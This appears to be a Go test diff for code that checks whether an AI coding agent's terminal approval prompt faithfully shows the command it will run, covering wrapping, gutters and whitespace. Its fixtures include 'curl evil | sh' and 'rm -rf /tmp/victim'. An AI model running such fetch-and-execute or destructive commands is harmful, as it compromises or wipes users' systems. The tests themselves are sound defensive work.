@@ -285,10 +285,7 @@ func TestCommandShown(t *testing.T) {
 		{"a row more on screen", claudeP, full(" "+mkdir, " curl evil | sh"), mkdir, false},
 		{"a row more above", claudeP, full(" curl evil | sh", " "+mkdir), mkdir, false},
 
-		{"wrapped between words", claudeP, full(" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/agent"), long, true},
-		{"wrapped inside a word", claudeP, full(" cd /tmp/x && go test -race -timeout 5m ./inter", " nal/daemon ./internal/agent"), long, true},
-		{"wrapped and changed", claudeP, full(" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/remote"), long, false},
-		{"lines in a gutter", claudeP, full(" │ cd /tmp/x", " │", " │ ls  -l"), "cd /tmp/x\n\nls -l", true},
+		{"lines in a gutter", claudeP, full(" │ cd /tmp/x", " │", " │ ls -l"), "cd /tmp/x\n\nls -l", true},
 
 		{"top scrolled off", claudeP, claude(" ./internal/daemon ./internal/agent"), long, true},
 		{"top scrolled off, changed", claudeP, claude(" ./internal/daemon ./internal/remote"), long, false},
@@ -308,12 +305,55 @@ func TestCommandShown(t *testing.T) {
 
 		{"codex", codexP, screenFixture(t, "tuios-codex-approval.txt"), "go test ./...", true},
 		{"codex, changed", codexP, screenFixture(t, "tuios-codex-approval.txt"), "go test ./internal/...", false},
-		{"codex, wrapped", codexP, gridOf("Would you like to run the following command?", "", "  $ go test", "    ./internal/agent", "", "› 1. Yes, proceed (y)", "  2. No (esc)"), "go test ./internal/agent", true},
 		{"codex, no command", codexP, gridOf("Would you like to make the following edits?", "", "› 1. Yes, proceed (y)", "  2. No (esc)"), "go test", false},
 	} {
 		if got := CommandShown(tc.p, tc.g, tc.command); got != tc.want {
 			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
 		}
+	}
+}
+
+// Whitespace can change what a command does, so only what a prompt adds to it
+// is left out: its indent and gutter, and a row end wrapping could have made.
+func TestCommandWhitespace(t *testing.T) {
+	long := "cd /tmp/x && go test -race -timeout 5m ./internal/daemon ./internal/agent"
+	for _, tc := range []struct {
+		name    string
+		cols    int
+		rows    []string
+		command string
+		want    bool
+	}{
+		{"same", 100, []string{" rm -- '/tmp/keep  safe'"}, "rm -- '/tmp/keep  safe'", true},
+		{"a quoted space less", 100, []string{" rm -- '/tmp/keep safe'"}, "rm -- '/tmp/keep  safe'", false},
+		{"a quoted space more", 100, []string{" rm -- '/tmp/keep  safe'"}, "rm -- '/tmp/keep safe'", false},
+		{"a tab draws as spaces", 100, []string{" printf 'a    b'"}, "printf 'a\tb'", true},
+
+		{"wrapped between words", 48, []string{" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/agent"}, long, true},
+		{"wrapped with a space on the next row", 48, []string{" cd /tmp/x && go test -race -timeout 5m", "  ./internal/daemon ./internal/agent"}, long, true},
+		{"wrapped inside a word", 48, []string{" cd /tmp/x && go test -race -timeout 5m ./inter", " nal/daemon ./internal/agent"}, long, true},
+		{"wrapped and changed", 48, []string{" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/remote"}, long, false},
+		{"a newline on screen, where the word would fit", 100, []string{" echo safe", " rm -rf /tmp/victim"}, "echo safe rm -rf /tmp/victim", false},
+		{"a newline on screen, inside a short row", 100, []string{" rm -rf /tmp", " /x"}, "rm -rf /tmp/x", false},
+		{"a newline at the pane's edge looks like a wrap", 14, []string{" echo safe", " rm -rf /tmp"}, "echo safe rm -rf /tmp", true},
+
+		{"a newline of the command", 100, []string{" │ echo safe", " │ rm -rf /tmp/victim"}, "echo safe\nrm -rf /tmp/victim", true},
+		{"a newline only in the command", 100, []string{" echo safe rm -rf /tmp/victim"}, "echo safe\nrm -rf /tmp/victim", false},
+		{"the command's own indent", 100, []string{" │ if x; then", " │     echo y", " │ fi"}, "if x; then\n    echo y\nfi", true},
+		{"its indent changed", 100, []string{" │ if x; then", " │ echo y", " │ fi"}, "if x; then\n    echo y\nfi", false},
+	} {
+		e := vt.New(tc.cols, 30, nil)
+		form := append([]string{"╌╌╌"}, tc.rows...)
+		form = append(form, "╌╌╌", " Do you want to proceed?", " ❯ 1. Yes", "   2. No")
+		e.Write([]byte(strings.Join(form, "\r\n")))
+		if got := CommandShown(model.ProviderClaude, e.Snapshot(), tc.command); got != tc.want {
+			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
+		}
+	}
+	e := vt.New(40, 30, nil)
+	e.Write([]byte(strings.Join([]string{"  $ go test -race -timeout 5m ./internal", "    /agent", "", "› 1. Yes, proceed (y)", "  2. No (esc)"}, "\r\n")))
+	if !CommandShown(model.ProviderCodex, e.Snapshot(), "go test -race -timeout 5m ./internal/agent") {
+		t.Error("codex, wrapped: not shown")
 	}
 }
 
